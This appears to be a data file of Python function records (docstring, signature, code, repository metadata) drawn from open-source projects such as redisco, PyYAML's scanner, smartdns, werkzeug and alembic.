{"docstring": "'''\nReturns a textual tree representation of the Node and its\nchildren nodes.  Used for debugging purposes.\n'''\n", "func_signal": "def str_tree(self, text=\"\", indentCount=0):\n", "code": "text = text + \"   \"*indentCount + self.__class__.__name__ + \"\\n\"\n\nfor child in self._children:\n    if isinstance(child, Node):\n        text += child.str_tree(\"\", indentCount + 1)\n    else:\n        text += \"   \"*(indentCount + 1) + child + \"\\n\"\n\nreturn text", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nNode Initializer\n'''\n\n", "func_signal": "def __init__(self, children=None, line=None, column=None):\n", "code": "if not children:\n    children = []\nelif not isinstance(children, list):\n    children = [children]\n\nself._children = children\nself._line = line\nself._column = column\n\nself._file = None", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "'''\nReturns an ArgList object, if one exists otherwise None\n'''\n", "func_signal": "def argList(self):\n", "code": "filtered = [child for child in self.children if isinstance(child, ArgumentList)]\n\nif not filtered:  # True, if filtered is []\n    return None\nelse:\n    return filtered[0]", "path": "intellect\\Node.py", "repo_name": "nemonik/Intellect", "stars": 410, "license": "other", "language": "python", "size": 794}
{"docstring": "\"\"\"Adds a property to the target of a reference field that\nreturns the list of associated objects.\n\"\"\"\n# this should be a descriptor\n", "func_signal": "def _initialize_referenced(model_class, attribute):\n", "code": "def _related_objects(self):\n    return (model_class.objects\n            .filter(**{attribute.attname: self.id}))\n\nklass = attribute._target_type\nif isinstance(klass, basestring):\n    return (klass, model_class, attribute)\nelse:\n    related_name = (attribute.related_name or\n            model_class.__name__.lower() + '_set')\n    setattr(klass, related_name,\n            property(_related_objects))", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Checks if the model with id exists.\"\"\"\n", "func_signal": "def exists(cls, id):\n", "code": "return bool(redisco.get_client().exists(cls._key[str(id)]) or\n            redisco.get_client().sismember(cls._key['all'], str(id)))", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Returns the Redis key where the values are stored.\"\"\"\n", "func_signal": "def key(self, att=None):\n", "code": "if att is not None:\n    return self._key[self.id][att]\nelse:\n    return self._key[self.id]", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Stores the list of reference field descriptors of a model.\"\"\"\n", "func_signal": "def _initialize_references(model_class, name, bases, attrs):\n", "code": "model_class._references = {}\nh = {}\ndeferred = []\nfor k, v in attrs.iteritems():\n    if isinstance(v, ReferenceField):\n        model_class._references[k] = v\n        v.name = v.name or k\n        att = Attribute(name=v.attname)\n        h[v.attname] = att\n        setattr(model_class, v.attname, att)\n        refd = _initialize_referenced(model_class, v)\n        if refd:\n            deferred.append(refd)\nattrs.update(h)\nreturn deferred", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Returns a key based on the attribute and its value.\n\nThe key is used for indexing.\n\"\"\"\n", "func_signal": "def _index_key_for(self, att, value=None):\n", "code": "if value is None:\n    value = getattr(self, att)\n    if callable(value):\n        value = value()\nif value is None:\n    return None\nif att not in self.lists:\n    return self._get_index_key_for_non_list_attr(att, value)\nelse:\n    return self._tuple_for_index_key_attr_list(att, value)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Gets the model from a given key.\"\"\"\n", "func_signal": "def get_model_from_key(key):\n", "code": "_known_models = {}\nmodel_name = key.split(':', 2)[0]\n# populate\nfor klass in Model.__subclasses__():\n    _known_models[klass.__name__] = klass\nreturn _known_models.get(model_name, None)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Returns the list of errors after validation.\"\"\"\n", "func_signal": "def errors(self):\n", "code": "if not hasattr(self, '_errors'):\n    self.is_valid()\nreturn self._errors", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"\nAdds the id to the index.\n\nThis also adds to the _indices set of the object.\n\"\"\"\n", "func_signal": "def _add_to_index(self, att, val=None, pipeline=None):\n", "code": "index = self._index_key_for(att)\nif index is None:\n    return\nt, index = index\nif t == 'attribute':\n    pipeline.sadd(index, self.id)\n    pipeline.sadd(self.key()['_indices'], index)\nelif t == 'list':\n    for i in index:\n        pipeline.sadd(i, self.id)\n        pipeline.sadd(self.key()['_indices'], i)\nelif t == 'sortedset':\n    zindex, index = index\n    pipeline.sadd(index, self.id)\n    pipeline.sadd(self.key()['_indices'], index)\n    descriptor = self.attributes[att]\n    score = descriptor.typecast_for_storage(getattr(self, att))\n    pipeline.zadd(zindex, self.id, score)\n    pipeline.sadd(self.key()['_zindices'], zindex)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Increments a counter.\"\"\"\n", "func_signal": "def incr(self, att, val=1):\n", "code": "if att not in self.counters:\n    raise ValueError(\"%s is not a counter.\")\nself.db.hincrby(self.key(), att, val)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Adds the base64 encoded values of the indices.\"\"\"\n", "func_signal": "def _add_to_indices(self, pipeline):\n", "code": "for att in self.indices:\n    self._add_to_index(att, pipeline=pipeline)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Stores the list of counter fields.\"\"\"\n", "func_signal": "def _initialize_counters(model_class, name, bases, attrs):\n", "code": "model_class._counters = []\nfor k, v in attrs.iteritems():\n    if isinstance(v, Counter):\n        model_class._counters.append(k)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Saves the instance to the datastore.\"\"\"\n", "func_signal": "def save(self):\n", "code": "if not self.is_valid():\n    return self._errors\n_new = self.is_new()\nif _new:\n    self._initialize_id()\nwith Mutex(self):\n    self._write(_new)\nreturn True", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Updates the indices of the object.\"\"\"\n", "func_signal": "def _update_indices(self, pipeline=None):\n", "code": "self._delete_from_indices(pipeline)\nself._add_to_indices(pipeline)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Updates the attributes of the model.\"\"\"\n", "func_signal": "def update_attributes(self, **kwargs):\n", "code": "attrs = self.attributes.values() + self.lists.values() \\\n        + self.references.values()\nfor att in attrs:\n    if att.name in kwargs:\n        att.__set__(self, kwargs[att.name])", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Deletes the object's id from the sets(indices) it has been added\nto and removes its list of indices (used for housekeeping).\n\"\"\"\n", "func_signal": "def _delete_from_indices(self, pipeline):\n", "code": "s = Set(self.key()['_indices'])\nz = Set(self.key()['_zindices'])\nfor index in s.members:\n    pipeline.srem(index, self.id)\nfor index in z.members:\n    pipeline.zrem(index, self.id)\npipeline.delete(s.key)\npipeline.delete(z.key)", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Stores the list of indexed attributes.\"\"\"\n", "func_signal": "def _initialize_indices(model_class, name, bases, attrs):\n", "code": "model_class._indices = []\nfor k, v in attrs.iteritems():\n    if isinstance(v, (Attribute, ListField)) and v.indexed:\n        model_class._indices.append(k)\nif model_class._meta['indices']:\n    model_class._indices.extend(model_class._meta['indices'])", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Writes the values of the attributes to the datastore.\n\nThis method also creates the indices and saves the lists\nassociated to the object.\n\"\"\"\n", "func_signal": "def _write(self, _new=False):\n", "code": "pipeline = self.db.pipeline()\nself._create_membership(pipeline)\nself._update_indices(pipeline)\nh = {}\n# attributes\nfor k, v in self.attributes.iteritems():\n    if isinstance(v, DateTimeField):\n        if v.auto_now:\n            setattr(self, k, datetime.now())\n        if v.auto_now_add and _new:\n            setattr(self, k, datetime.now())\n    elif isinstance(v, DateField):\n        if v.auto_now:\n            setattr(self, k, date.today())\n        if v.auto_now_add and _new:\n            setattr(self, k, date.today())\n    for_storage = getattr(self, k)\n    if for_storage is not None:\n        h[k] = v.typecast_for_storage(for_storage)\n# indices\nfor index in self.indices:\n    if index not in self.lists and index not in self.attributes:\n        v = getattr(self, index)\n        if callable(v):\n            v = v()\n        if v:\n            try:\n                h[index] = unicode(v)\n            except UnicodeError:\n                h[index] = unicode(v.decode('utf-8'))\npipeline.delete(self.key())\nif h:\n    pipeline.hmset(self.key(), h)\n\n# lists\nfor k, v in self.lists.iteritems():\n    l = List(self.key()[k], pipeline=pipeline)\n    l.clear()\n    values = getattr(self, k)\n    if values:\n        if v._redisco_model:\n            l.extend([item.id for item in values])\n        else:\n            l.extend(values)\npipeline.execute()", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Returns the mapping of the model attributes and their\nvalues.\n\"\"\"\n", "func_signal": "def attributes_dict(self):\n", "code": "h = {}\nfor k in self.attributes.keys():\n    h[k] = getattr(self, k)\nfor k in self.lists.keys():\n    h[k] = getattr(self, k)\nfor k in self.references.keys():\n    h[k] = getattr(self, k)\nreturn h", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Returns the list of field names of the model.\"\"\"\n", "func_signal": "def fields(self):\n", "code": "return (self.attributes.values() + self.lists.values()\n        + self.references.values())", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "\"\"\"Deletes the object from the datastore.\"\"\"\n", "func_signal": "def delete(self):\n", "code": "pipeline = self.db.pipeline()\nself._delete_from_indices(pipeline)\nself._delete_membership(pipeline)\npipeline.delete(self.key())\npipeline.execute()", "path": "redisco\\models\\base.py", "repo_name": "iamteem/redisco", "stars": 302, "license": "mit", "language": "python", "size": 411}
{"docstring": "# VALUE(flow context):  ':'\n", "func_signal": "def check_value(self):\n", "code": "        if self.flow_level:\n            return True\n# VALUE(block context): ':' (' '|'\\n')\n        else:\n            return self.peek(1) in u'\\0 \\t\\r\\n\\x85\\u2028\\u2029'", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n", "func_signal": "def scan_block_scalar_breaks(self, indent):\n", "code": "chunks = []\nend_mark = self.get_mark()\nwhile self.column < indent and self.peek() == u' ':\n    self.forward()\nwhile self.peek() in u'\\r\\n\\x85\\u2028\\u2029':\n    chunks.append(self.scan_line_break())\n    end_mark = self.get_mark()\n    while self.column < indent and self.peek() == u' ':\n        self.forward()\nreturn chunks, end_mark", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "#if len(message.additional) > 0:\n#    print inspect.getmembers(message.additional[0]\n# \u53ef\u4ee5\u652f\u6301\u591a\u4e2aquery\n", "func_signal": "def handleQuery(self, message, protocol, address):\n", "code": "query = message.queries[0]\nedns = None\ncliAddr = address\nif query.type == 43 or typeToMethod[query.type] == 'lookupAllRecords':\n    return [(),(),()]\nif typeToMethod[query.type] in smartType and \\\n            len(message.additional) != 0 and \\\n            message.additional[0].type == 41 \\\n            and message.additional[0].rdlength > 8:\n        cliAddr = (message.additional[0].payload.dottedQuad(), 0)\n        edns = message.additional[0]\nlogger.info(\"[type: %s]\\t[protocol: %s]\\t[query: %s]\\t[address: %s]\\t[dns_server_addr: %s]\\t[additional: %s]\" % \\\n    (typeToMethod[query.type], type(protocol), query, cliAddr[0], address[0], edns))\nreturn self.resolver.query(query, addr = cliAddr, edns = edns).addCallback(\n        self.gotResolverResponse, protocol, message, address\n    ).addErrback(\n        self.gotResolverError, protocol, message, address\n    )", "path": "bin\\dnsserver.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n", "func_signal": "def scan_block_scalar_indicators(self, start_mark):\n", "code": "chomping = None\nincrement = None\nch = self.peek()\nif ch in u'+-':\n    if ch == '+':\n        chomping = True\n    else:\n        chomping = False\n    self.forward()\n    ch = self.peek()\n    if ch in u'0123456789':\n        increment = int(ch)\n        if increment == 0:\n            raise ScannerError(\"while scanning a block scalar\", start_mark,\n                    \"expected indentation indicator in the range 1-9, but found 0\",\n                    self.get_mark())\n        self.forward()\nelif ch in u'0123456789':\n    increment = int(ch)\n    if increment == 0:\n        raise ScannerError(\"while scanning a block scalar\", start_mark,\n                \"expected indentation indicator in the range 1-9, but found 0\",\n                self.get_mark())\n    self.forward()\n    ch = self.peek()\n    if ch in u'+-':\n        if ch == '+':\n            chomping = True\n        else:\n            chomping = False\n        self.forward()\nch = self.peek()\nif ch not in u'\\0 \\r\\n\\x85\\u2028\\u2029':\n    raise ScannerError(\"while scanning a block scalar\", start_mark,\n            \"expected chomping or indentation indicators, but found %r\"\n                % ch.encode('utf-8'), self.get_mark())\nreturn chomping, increment", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# Drop the DOCUMENT-START event.\n", "func_signal": "def compose_document(self):\n", "code": "self.get_event()\n\n# Compose the root node.\nnode = self.compose_node(None, None)\n\n# Drop the DOCUMENT-END event.\nself.get_event()\n\nself.anchors = {}\nreturn node", "path": "lib\\yaml\\composer.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# Return the next token.\n", "func_signal": "def get_token(self):\n", "code": "while self.need_more_tokens():\n    self.fetch_more_tokens()\nif self.tokens:\n    self.tokens_taken += 1\n    return self.tokens.pop(0)", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# Remove the saved possible key position at the current flow level.\n", "func_signal": "def remove_possible_simple_key(self):\n", "code": "if self.flow_level in self.possible_simple_keys:\n    key = self.possible_simple_keys[self.flow_level]\n    \n    if key.required:\n        raise ScannerError(\"while scanning a simple key\", key.mark,\n                \"could not found expected ':'\", self.get_mark())\n\n    del self.possible_simple_keys[self.flow_level]", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "\"\"\"Initialize the scanner.\"\"\"\n# It is assumed that Scanner and Reader will have a common descendant.\n# Reader do the dirty work of checking for BOM and converting the\n# input data to Unicode. It also adds NUL to the end.\n#\n# Reader supports the following methods\n#   self.peek(i=0)       # peek the next i-th character\n#   self.prefix(l=1)     # peek the next l characters\n#   self.forward(l=1)    # read the next l characters and move the pointer.\n\n# Had we reached the end of the stream?\n", "func_signal": "def __init__(self):\n", "code": "self.done = False\n\n# The number of unclosed '{' and '['. `flow_level == 0` means block\n# context.\nself.flow_level = 0\n\n# List of processed tokens that are not yet emitted.\nself.tokens = []\n\n# Add the STREAM-START token.\nself.fetch_stream_start()\n\n# Number of tokens that were emitted through the `get_token` method.\nself.tokens_taken = 0\n\n# The current indentation level.\nself.indent = -1\n\n# Past indentation levels.\nself.indents = []\n\n# Variables related to simple keys treatment.\n\n# A simple key is a key that is not denoted by the '?' indicator.\n# Example of simple keys:\n#   ---\n#   block simple key: value\n#   ? not a simple key:\n#   : { flow simple key: value }\n# We emit the KEY token before all keys, so when we find a potential\n# simple key, we try to locate the corresponding ':' indicator.\n# Simple keys should be limited to a single line and 1024 characters.\n\n# Can a simple key start at the current position? A simple key may\n# start:\n# - at the beginning of the line, not counting indentation spaces\n#       (in block context),\n# - after '{', '[', ',' (in the flow context),\n# - after '?', ':', '-' (in the block context).\n# In the block context, this flag also signifies if a block collection\n# may start at the current position.\nself.allow_simple_key = True\n\n# Keep track of possible simple keys. This is a dictionary. The key\n# is `flow_level`; there can be no more that one possible simple key\n# for each level. The value is a SimpleKey record:\n#   (token_number, required, index, line, column, mark)\n# A simple key may start with ALIAS, ANCHOR, TAG, SCALAR(flow),\n# '[', or '{' tokens.\nself.possible_simple_keys = {}", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# We ignore spaces, line breaks and comments.\n# If we find a line break in the block context, we set the flag\n# `allow_simple_key` on.\n# The byte order mark is stripped if it's the first character in the\n# stream. We do not yet support BOM inside the stream as the\n# specification requires. Any such mark will be considered as a part\n# of the document.\n#\n# TODO: We need to make tab handling rules more sane. A good rule is\n#   Tabs cannot precede tokens\n#   BLOCK-SEQUENCE-START, BLOCK-MAPPING-START, BLOCK-END,\n#   KEY(block), VALUE(block), BLOCK-ENTRY\n# So the checking code is\n#   if <TAB>:\n#       self.allow_simple_keys = False\n# We also need to add the check for `allow_simple_keys == True` to\n# `unwind_indent` before issuing BLOCK-END.\n# Scanners for block, flow, and plain scalars need to be modified.\n\n", "func_signal": "def scan_to_next_token(self):\n", "code": "if self.index == 0 and self.peek() == u'\\uFEFF':\n    self.forward()\nfound = False\nwhile not found:\n    while self.peek() == u' ':\n        self.forward()\n    if self.peek() == u'#':\n        while self.peek() not in u'\\0\\r\\n\\x85\\u2028\\u2029':\n            self.forward()\n    if self.scan_line_break():\n        if not self.flow_level:\n            self.allow_simple_key = True\n    else:\n        found = True", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n", "func_signal": "def scan_directive_name(self, start_mark):\n", "code": "length = 0\nch = self.peek(length)\nwhile u'0' <= ch <= u'9' or u'A' <= ch <= u'Z' or u'a' <= ch <= u'z'    \\\n        or ch in u'-_':\n    length += 1\n    ch = self.peek(length)\nif not length:\n    raise ScannerError(\"while scanning a directive\", start_mark,\n            \"expected alphabetic or numeric character, but found %r\"\n            % ch.encode('utf-8'), self.get_mark())\nvalue = self.prefix(length)\nself.forward(length)\nch = self.peek()\nif ch not in u'\\0 \\r\\n\\x85\\u2028\\u2029':\n    raise ScannerError(\"while scanning a directive\", start_mark,\n            \"expected alphabetic or numeric character, but found %r\"\n            % ch.encode('utf-8'), self.get_mark())\nreturn value", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# AuthoritativeDomainErrors should halt resolution attempts\n", "func_signal": "def __call__(self, failure):\n", "code": "failure.trap(dns.DomainError, defer.TimeoutError, NotImplementedError)\nreturn self.resolver(self.query, self.timeout, self.addr, self.edns)", "path": "bin\\dnsserver.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# A flow scalar could be a simple key.\n", "func_signal": "def fetch_flow_scalar(self, style):\n", "code": "        self.save_possible_simple_key()\n# No simple keys after flow scalars.\n        self.allow_simple_key = False\n# Scan and add SCALAR.\n        self.tokens.append(self.scan_flow_scalar(style))", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n", "func_signal": "def scan_block_scalar_indentation(self):\n", "code": "chunks = []\nmax_indent = 0\nend_mark = self.get_mark()\nwhile self.peek() in u' \\r\\n\\x85\\u2028\\u2029':\n    if self.peek() != u' ':\n        chunks.append(self.scan_line_break())\n        end_mark = self.get_mark()\n    else:\n        self.forward()\n        if self.column > max_indent:\n            max_indent = self.column\nreturn chunks, max_indent, end_mark", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n", "func_signal": "def scan_flow_scalar_breaks(self, double, start_mark):\n", "code": "chunks = []\nwhile True:\n    # Instead of checking indentation, we check for document\n    # separators.\n    prefix = self.prefix(3)\n    if (prefix == u'---' or prefix == u'...')   \\\n            and self.peek(3) in u'\\0 \\t\\r\\n\\x85\\u2028\\u2029':\n        raise ScannerError(\"while scanning a quoted scalar\", start_mark,\n                \"found unexpected document separator\", self.get_mark())\n    while self.peek() in u' \\t':\n        self.forward()\n    if self.peek() in u'\\r\\n\\x85\\u2028\\u2029':\n        chunks.append(self.scan_line_break())\n    else:\n        return chunks", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "## In flow context, tokens should respect indentation.\n        ## Actually the condition should be `self.indent >= column` according to\n        ## the spec. But this condition will prohibit intuitively correct\n        ## constructions such as\n        ## key : {\n        ## }\n        #if self.flow_level and self.indent > column:\n        #    raise ScannerError(None, None,\n        #            \"invalid intendation or unclosed '[' or '{'\",\n        #            self.get_mark())\n# In the flow context, indentation is ignored. We make the scanner less\n        # restrictive then specification requires.\n", "func_signal": "def unwind_indent(self, column):\n", "code": "        if self.flow_level:\n            return\n# In block context, we may need to issue the BLOCK-END tokens.\n        while self.indent > column:\n            mark = self.get_mark()\n            self.indent = self.indents.pop()\n            self.tokens.append(BlockEndToken(mark, mark))", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n# For some strange reasons, the specification does not allow '_' in\n# tag handles. I have allowed it anyway.\n", "func_signal": "def scan_tag_handle(self, name, start_mark):\n", "code": "ch = self.peek()\nif ch != u'!':\n    raise ScannerError(\"while scanning a %s\" % name, start_mark,\n            \"expected '!', but found %r\" % ch.encode('utf-8'),\n            self.get_mark())\nlength = 1\nch = self.peek(length)\nif ch != u' ':\n    while u'0' <= ch <= u'9' or u'A' <= ch <= u'Z' or u'a' <= ch <= u'z'    \\\n            or ch in u'-_':\n        length += 1\n        ch = self.peek(length)\n    if ch != u'!':\n        self.forward(length)\n        raise ScannerError(\"while scanning a %s\" % name, start_mark,\n                \"expected '!', but found %r\" % ch.encode('utf-8'),\n                self.get_mark())\n    length += 1\nvalue = self.prefix(length)\nself.forward(length)\nreturn value", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# '[' and '{' may start a simple key.\n", "func_signal": "def fetch_flow_collection_start(self, TokenClass):\n", "code": "        self.save_possible_simple_key()\n# Increase the flow level.\n        self.flow_level += 1\n# Simple keys are allowed after '[' and '{'.\n        self.allow_simple_key = True\n# Add FLOW-SEQUENCE-START or FLOW-MAPPING-START.\n        start_mark = self.get_mark()\n        self.forward()\n        end_mark = self.get_mark()\n        self.tokens.append(TokenClass(start_mark, end_mark))", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# ANCHOR could start a simple key.\n", "func_signal": "def fetch_anchor(self):\n", "code": "        self.save_possible_simple_key()\n# No simple keys after ANCHOR.\n        self.allow_simple_key = False\n# Scan and add ANCHOR.\n        self.tokens.append(self.scan_anchor(AnchorToken))", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# See the specification for details.\n# Note that we loose indentation rules for quoted scalars. Quoted\n# scalars don't need to adhere indentation because \" and ' clearly\n# mark the beginning and the end of them. Therefore we are less\n# restrictive then the specification requires. We only need to check\n# that document separators are not included in scalars.\n", "func_signal": "def scan_flow_scalar(self, style):\n", "code": "if style == '\"':\n    double = True\nelse:\n    double = False\nchunks = []\nstart_mark = self.get_mark()\nquote = self.peek()\nself.forward()\nchunks.extend(self.scan_flow_scalar_non_spaces(double, start_mark))\nwhile self.peek() != quote:\n    chunks.extend(self.scan_flow_scalar_spaces(double, start_mark))\n    chunks.extend(self.scan_flow_scalar_non_spaces(double, start_mark))\nself.forward()\nend_mark = self.get_mark()\nreturn ScalarToken(u''.join(chunks), False, start_mark, end_mark,\n        style)", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "# Set the current intendation to -1.\n", "func_signal": "def fetch_directive(self):\n", "code": "        self.unwind_indent(-1)\n\n        # Reset simple keys.\n        self.remove_possible_simple_key()\n        self.allow_simple_key = False\n\n        # Scan and add DIRECTIVE.\n        self.tokens.append(self.scan_directive())", "path": "lib\\yaml\\scanner.py", "repo_name": "xiaomi-sa/smartdns", "stars": 351, "license": "None", "language": "python", "size": 3350}
{"docstring": "\"\"\"Called in the EnvironBuilder to add files from the data dict.\"\"\"\n", "func_signal": "def _add_file_from_data(self, key, value):\n", "code": "if isinstance(value, tuple):\n    self.files.add_file(key, *value)\nelif isinstance(value, dict):\n    from warnings import warn\n    warn(DeprecationWarning('it\\'s no longer possible to pass dicts '\n                            'as `data`.  Use tuples or FileStorage '\n                            'objects instead'), stacklevel=2)\n    value = dict(value)\n    mimetype = value.pop('mimetype', None)\n    if mimetype is not None:\n        value['content_type'] = mimetype\n    self.files.add_file(key, **value)\nelse:\n    self.files.add_file(key, value)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\" Assign attrs to element. \"\"\"\n", "func_signal": "def assign_attrs(self, elem, attrs):\n", "code": "for k, v in get_attrs(attrs):\n    if k == '.':\n        # add to class\n        cls = elem.get('class')\n        if cls:\n            elem.set('class', '%s %s' % (cls, v))\n        else:\n            elem.set('class', v)\n    else:\n        # assign attr k with v\n        elem.set(self.sanitize_name(k), v)", "path": "libs\\markdown\\extensions\\attr_list.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Inject the cookies as client headers into the server's wsgi\nenvironment.\n\"\"\"\n", "func_signal": "def inject_wsgi(self, environ):\n", "code": "cvals = []\nfor cookie in self:\n    cvals.append('%s=%s' % (cookie.name, cookie.value))\nif cvals:\n    environ['HTTP_COOKIE'] = '; '.join(cvals)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Like `stream_encode_multipart` but returns a tuple in the form\n(``boundary``, ``data``) where data is a bytestring.\n\"\"\"\n", "func_signal": "def encode_multipart(values, boundary=None, charset='utf-8'):\n", "code": "stream, length, boundary = stream_encode_multipart(\n    values, use_tempfile=False, boundary=boundary, charset=charset)\nreturn boundary, stream.read()", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Given a python source path, locate the .pyc.\n\nSee http://www.python.org/dev/peps/pep-3147/\n                    #detecting-pep-3147-availability\n    http://www.python.org/dev/peps/pep-3147/#file-extension-checks\n\n\"\"\"\n", "func_signal": "def pyc_file_from_path(path):\n", "code": "import imp\nhas3147 = hasattr(imp, 'get_tag')\nif has3147:\n    return imp.cache_from_source(path)\nelse:\n    return path + \"c\"", "path": "libs\\alembic\\util.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Load a file from the given path as a Python module.\"\"\"\n\n", "func_signal": "def load_python_file(dir_, filename):\n", "code": "module_id = re.sub(r'\\W', \"_\", filename)\npath = os.path.join(dir_, filename)\nmodule = imp.load_source(module_id, path, open(path, 'rb'))\ndel sys.modules[module_id]\nreturn module", "path": "libs\\alembic\\util.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Like open but method is enforced to PUT.\"\"\"\n", "func_signal": "def put(self, *args, **kw):\n", "code": "kw['method'] = 'PUT'\nreturn self.open(*args, **kw)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
